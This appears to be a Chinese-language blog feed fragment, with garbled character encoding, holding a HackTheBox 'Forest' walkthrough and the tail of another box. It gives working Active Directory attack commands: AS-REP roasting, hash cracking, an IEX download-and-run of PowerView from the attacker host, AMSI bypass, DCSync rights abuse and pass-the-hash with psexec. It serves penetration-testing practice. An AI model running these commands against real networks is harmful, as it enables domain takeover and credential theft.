<p><img src="https://img-blog.csdnimg.cn/24f4c7e28cee4d33bef37d56e48ad59a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨<code>evil-winrm</code>è¿›è¡Œç™»å½•ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<code>wmiexec.py</code>è¿™ä¸ªè„šæœ¬è¿›è¡Œç™»å½•ï¼Œä½†æ˜¯åè€…çš„é€Ÿåº¦è¦ç›¸è¾ƒå‰è€…æ…¢å¾—å¤š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/42316c86c9ba4720b9fd0f6684ecec19.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes :823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b57c846f068946208ef0673c1765edf0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Forest</title>
    <url>/2021/12/24/Forest/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/2913cb4eedb44306869932340084824e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -Pn -A -p1-65535 10.10.10.161</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65511 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-21 11:03:55Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49684/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49706/tcp open  unknown</span><br><span class="line">49931/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=10/21%OT=53%CT=1%CU=36900%PV=Y%DS=2%DC=T%G=Y%TM=617148</span><br><span class="line">OS:13%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=S%TS</span><br><span class="line">OS:=A)SEQ(SP=104%GCD=1%ISR=104%TI=I%CI=I%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8</span><br><span class="line">OS:ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=20</span><br><span class="line">OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5</span><br><span class="line">OS:4DNW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D</span><br><span class="line">OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O</span><br><span class="line">OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W</span><br><span class="line">OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)</span><br><span class="line">OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U</span><br><span class="line">OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h26m49s, deviation: 4h02m32s, median: 6m47s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2021-10-21T04:05:16-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-10-21T11:05:15</span><br><span class="line">|_  start_date: 2021-10-21T07:03:53</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1723/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   321.85 ms 10.10.14.1</span><br><span class="line">2   321.83 ms 10.10.10.161</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3716.43 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>æˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡ŒåŒ¿åç™»å½•ï¼Œæˆ‘ä»¬å°è¯•åŒ¿åç™»å½•SMBæœåŠ¡ï¼Œçœ‹çœ‹æœ‰å“ªäº›æœ‰ä»·å€¼çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/e568f2f0f0ef419da569481703bc97f1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç­”æ¡ˆæ˜¯æ²¡æœ‰ï¼Œæ²¡æœ‰ä»€ä¹ˆå…±äº«ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/9315d9655d274be9baf1173d824bbf38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>ä¸Šé¢ä¿¡æ¯æ”¶é›†æ—¶å‘ç°äº†ldapæœåŠ¡ï¼Œé‚£æˆ‘ä»¬å°è¯•ä½¿ç”¨ldapsearchå·¥å…·å¯¹<code>namingcontexts</code>å­—æ®µè¿›è¡Œå‘æ˜<br><img src="https://img-blog.csdnimg.cn/5159dbdc249c4274ba73c56d802ba67c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•æ›´æ·±å…¥åœ°æŒ–æ˜DNä¿¡æ¯ï¼Œå¹¶å°è¯•è·å–åŸŸä¸­çš„ç”¨æˆ·åˆ—è¡¨<br><img src="https://img-blog.csdnimg.cn/412eb99806c84827a8d4924b17aab912.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<code>enum4linux</code>è·å–ç”¨æˆ·<br><img src="https://img-blog.csdnimg.cn/295e9874f8a94b21b77a12fd68e7de09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†æœé›†çš„ä¿¡æ¯ä¿å­˜ä¸ºä¸€ä¸ª<code>anon_ldap.txt</code>æ–‡ä»¶ï¼Œè¿‡æ»¤å‡º<code>svc-alfresco</code>ç”¨æˆ·çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/323186c2631f445e8f56396ebc761eef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬æ‹¿åˆ°è´¦å·å’Œç”¨æˆ·ååï¼Œæˆ‘ä»¬å¾—æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¯ç”¨äº†é¢„è®¤è¯ï¼Œè¿™é‡Œè§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯é¢„è®¤è¯</p>
<blockquote>
<p><strong>åœ¨è¯·æ±‚ TGTï¼ˆç¥¨è¯æˆäºˆç¥¨è¯ï¼‰æ—¶ï¼Œç¬¬ä¸€æ­¥ï¼Œè¯·æ±‚æ–¹ï¼ˆç”¨æˆ·ï¼‰ä½¿ç”¨è‡ªå·±çš„ NTLM å“ˆå¸ŒåŠ å¯†æ—¶é—´æˆ³ï¼Œå¹¶å°†å…¶å‘é€åˆ° KDCï¼ˆå¯†é’¥åˆ†å‘ä¸­å¿ƒï¼‰ï¼Œå³åŸŸæ§åˆ¶å™¨ã€‚ç°åœ¨ï¼Œå¦‚æœ KDC ä½¿ç”¨è¯·æ±‚ç”¨æˆ·çš„ NTLM å“ˆå¸ŒæˆåŠŸè§£å¯†æ—¶é—´æˆ³ï¼ŒKDC å°†çŸ¥é“è¯·æ±‚ç”¨æˆ·æ˜¯æœ‰æ•ˆç”¨æˆ·ã€‚<br>å¯ä»¥ç¦ç”¨æ­¤æ£€æŸ¥ï¼ˆè¿™ä¸æ˜¯é»˜è®¤æƒ…å†µï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒKDC ä¸ä¼šéªŒè¯è¯·æ±‚ TGT çš„ç”¨æˆ·æ˜¯å¦æœ‰æ•ˆï¼Œè€Œæ˜¯å°† TGT å‘é€å›è¯·æ±‚è€…ã€‚<br>è¯¥ TGT åŒ…å«ä½¿ç”¨è¯·æ±‚ç”¨æˆ·çš„ NTLM å“ˆå¸ŒåŠ å¯†çš„éƒ¨åˆ†æ•°æ®ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†å“ˆå¸Œè„±æœºå¹¶å°è¯•ç ´è§£å®ƒã€‚</strong></p>
</blockquote>
<p>é‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>impacket</code>åŒ…ä¸­çš„<code>GetNPUsers.py</code>è¿™ä¸ªè„šæœ¬å»è¯·æ±‚TGTï¼Œç›´æ¥è·å–æ˜“å—æ”»å‡»çš„ç”¨æˆ·ååŠå¯¹åº”çš„å“ˆå¸Œå€¼<br><img src="https://img-blog.csdnimg.cn/5284eb6938a448ed9fc2c450536c9ebc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨<code>john</code>æ¥ç ´è§£è¿™ä¸ªhashå€¼ï¼Œç ´è§£çš„æ˜æ–‡å€¼ä¸º<code>s3rvice</code><br><img src="https://img-blog.csdnimg.cn/171d16fb086e4306aed46bcfde8464e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨hashcatæ¥ç ´è§£</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ac55b719cfc140b1ada3ab3f1ec23de1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å› ä¸ºä¸Šè¾¹æˆ‘ä»¬æ‰«æåˆ°ä¸»æœºå¼€æ”¾äº†5985ç«¯å£ï¼Œé‚£è¯æ˜ä¸»æœºå¼€æ”¾äº†WinRMæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u <span class="string">&#x27;svc-alfresco&#x27;</span> -p <span class="string">&#x27;s3rvice&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/391c73ad0f65465dbec84f80162fe866.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬ä½¿ç”¨Bloodhoundè¿™ä¸ªå·¥å…·æŸ¥è¯¢æ˜¯å¦æœ‰æ½œåœ¨çš„ææƒè·¯å¾„ï¼Œé¦–å…ˆæˆ‘ä»¬å¾—å…ˆæŠŠå®¢æˆ·ç«¯<code>SharpHound.exe</code>ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šï¼Œå¹¶è¿è¡Œå®ƒ<br><img src="https://img-blog.csdnimg.cn/df95f275e38340aba9d52b2aa90c838e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/eaa70b145a0143d790b4d8c629a36d7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ä¼ è¾“ï¼Œæˆ‘ä»¬åœ¨æœ¬æœºä¸Šæ­å»ºä¸€ä¸ªSMBæœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/a6dcecf002764ceb89b526cfc469f895.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å°†å‹ç¼©åŒ…å¤åˆ¶åˆ°æœ¬æœºä¸Š<br><img src="https://img-blog.csdnimg.cn/9c2108c5892d4762af178e042896411e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨æ”»å‡»æœºä¸Šå¯åŠ¨bloodhoundï¼Œå¹¶å°†å‹ç¼©åŒ…æ‹–è¿›bloodhoundä¸­<br><img src="https://img-blog.csdnimg.cn/0e1aedb210f74238ba29dd65d3cfb738.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç‚¹å‡»æœ€åä¸€ä¸ªé€‰é¡¹ï¼ŒæŸ¥çœ‹å¯ä»¥è¿›è¡Œå“ˆå¸Œä¼ é€’çš„ç”¨æˆ·<br><img src="https://img-blog.csdnimg.cn/7d5109e17fd740c08689be66a2ce0c35.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå†ç‚¹å‡»è¿™ä¸ªé€‰é¡¹<br><img src="https://img-blog.csdnimg.cn/e417b9a4c91442eeb7e5f52dc99ec7be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/6899426da41d42139be684f6f99e7772.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°<code>svc-alfresco</code>è¿™ä¸ªç”¨æˆ·æ˜¯å±äº<code>service account</code>è¿™ä¸ªç»„çš„æˆå‘˜ï¼ŒåŒæ—¶å®ƒä¹Ÿæ˜¯<code>Privileged IT Accounts</code>çš„æˆå‘˜ï¼Œå®ƒä¹Ÿæ˜¯<code>account operators</code>çš„æˆå‘˜ã€‚å®ƒå…è®¸è¯¥ç»„çš„æˆå‘˜åˆ›å»ºå’Œä¿®æ”¹ç”¨æˆ·å¹¶å°†å…¶æ·»åŠ åˆ°ä¸å—ä¿æŠ¤çš„ç»„<br><img src="https://img-blog.csdnimg.cn/e2cdb6b465b74640a64b7ea297939ce3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬ç°åœ¨ç‚¹å‡»<code>Shortest Paths to High Value Targets</code>ï¼ŒæŸ¥çœ‹å»å¾€é«˜æƒé™ç›®æ ‡çš„è·¯å¾„ã€‚è¯¥ç”¨æˆ·å…·æœ‰<code>GenericAll</code>çš„æƒé™å’Œ<code>Exchange Windows</code>æƒé™ç»„ã€‚åœ¨<code>Exchange Windows</code>æƒé™ç»„å…·æœ‰<code>WriteDacl</code>åœ¨åŸŸçš„æƒé™ã€‚è¯¥<code>WriteDacl</code>æƒé™ä½¿ç”¨æˆ·èƒ½å¤Ÿå‘å¯¹è±¡æ·»åŠ <code>DACL</code>ï¼ˆè‡ªç”±è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ã€‚<br><img src="https://img-blog.csdnimg.cn/c6d80a75b47946b2bb2b74041117d941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>é‚£å°±æ„å‘³ç€ï¼š</strong></p>
<p> <strong>1. æˆ‘ä»¬å¯ä»¥å°†ç”¨æˆ·æ·»åŠ åˆ°Exchange Windows æƒé™ç»„ã€‚<br> 2. ç„¶åï¼Œç”±äº Exchange ç»„æœ‰WriteDaclæƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å°†DCSyncæƒé™æˆäºˆæˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·ã€‚</strong></p>
<blockquote>
<p> <strong>DCsyncæ˜¯å‡ ä¸ªæƒé™çš„é›†åˆä½“ï¼Œæ˜¯åŸŸæ¸—é€ä¸­ç»å¸¸ä¼šç”¨åˆ°çš„æŠ€æœ¯ï¼Œå¦‚æœæ™®é€šç”¨æˆ·æƒ³å…·æœ‰DCsyncæƒé™ï¼Œå¯ä»¥ç»™å¯¹è±¡æ·»åŠ ä»¥ä¸‹ä¸‰æ¡ACEï¼š<br> DS-Replication-Get-Changesï¼Œå¯¹åº”GUIDä¸ºï¼š1131f6aa-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-Allï¼Œå¯¹åº”GUIDä¸ºï¼š1131f6ad-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-In-Filtered-Setï¼Œå¯¹åº”GUIDä¸ºï¼š89e95b76-444d-4c62-991a-0facbeda640c</strong></p>
</blockquote>
<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>é¦–å…ˆæˆ‘ä»¬å…ˆå°†ç”¨æˆ·æ·»åŠ åˆ°åŸŸä¸­<br><img src="https://img-blog.csdnimg.cn/412def70d225418188f892346169b474.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å°†ç”¨æˆ·æ·»åŠ åˆ°<code>Exchange Windows</code>æƒé™ç»„<br><img src="https://img-blog.csdnimg.cn/ead54544e07d4f67bcb1f4d5c4c973d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬çœ‹çœ‹èœå•ï¼Œæˆ‘ä»¬é€‰æ‹©<code>Bypass-4MSI</code>ï¼Œ<code>Bypass-4MSI</code>å‘½ä»¤ç”¨äºåœ¨å¯¼å…¥è„šæœ¬ä¹‹å‰è§„é¿é˜²å¾¡è€…ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>Add-ObjectACL</code>å’Œ<code>john</code>çš„å‡­è¯ï¼Œå¹¶ç»™ä»–<code>DCSync</code>æƒé™ã€‚<br><img src="https://img-blog.csdnimg.cn/84b58436b0f54790bfdc7e1e5823e29a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åè¾“å…¥ä»¥ä¸‹çš„powershellçš„ä»£ç </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.11/PowerView.ps1&#x27;</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Secpassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;password1234&#x27;</span> <span class="literal">-asplaintext</span> <span class="literal">-force</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\pyh&#x27;</span>,<span class="variable">$Secpassword</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">Add-ObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=htb,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> pyh <span class="literal">-Rights</span> DCSync</span><br></pre></td></tr></table></figure>
<p>å¼€å¯ä¸€ä¸ªå°å‹æœåŠ¡å™¨<br><img src="https://img-blog.csdnimg.cn/37f75053912d4977b8ec82cc263da07f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰§è¡Œå®Œæˆåï¼Œæˆ‘ä»¬ä½¿ç”¨<code>secretdumps.py</code>è„šæœ¬è·å–ç”¨æˆ·åå¯¹åº”çš„å“ˆå¸Œå€¼ã€‚è¿™é‡Œæˆ‘ä»¬è·å–åˆ°äº†ç®¡ç†å‘˜çš„å“ˆå¸Œå€¼<br><img src="https://img-blog.csdnimg.cn/16f9219409ec4fa78100ba391a0cf942.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨<code>psexec.py</code>è„šæœ¬æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œè·å–åˆ°è¶…çº§ç®¡ç†å‘˜æƒé™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</span><br></pre></td></tr></table></figure>

